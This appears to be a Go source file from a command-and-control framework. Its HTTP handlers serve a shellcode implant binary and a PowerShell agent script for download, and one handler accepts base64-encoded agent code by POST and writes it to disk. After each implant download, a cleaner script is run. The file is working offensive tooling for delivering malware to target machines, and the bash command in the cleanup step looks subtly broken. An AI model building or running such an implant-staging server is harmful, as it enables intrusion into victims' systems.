package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
)

func windowsImplant(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Agent getting downloaded")
	filepath := "..\\OutputShellcode\\implant.bin"
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		fmt.Println("File does not exist:", err)
		http.Error(w, "File not found.", http.StatusNotFound)
		return
	}
	http.ServeFile(w, r, filepath)

	fmt.Println("Cleaning loader...")
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "python ..\\Encryption\\Cleaner.py")
	} else {
		cmd = exec.Command("/bin/bash", "python ../Encryption/Cleaner.py")
	}

	err := cmd.Run()
	if err != nil {
		log.Fatal("Error: ", err)
	}
}

func powerShellImplant(w http.ResponseWriter, r *http.Request) {
	filePath := "implants/windows/powershell/agent.ps1"

	if r.Method == http.MethodPost {
		var agent Agent
		err := json.NewDecoder(r.Body).Decode(&agent)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		decoded, err := base64.StdEncoding.DecodeString(agent.Code)
		if err != nil {
			http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
			return
		}
		agent.Code = string(decoded)
		err = ioutil.WriteFile(filePath, []byte(agent.Code), 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	} else if r.Method == http.MethodGet {
		fmt.Println("Hit to download powershell script")
		http.ServeFile(w, r, filePath)
	} else {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	}
}
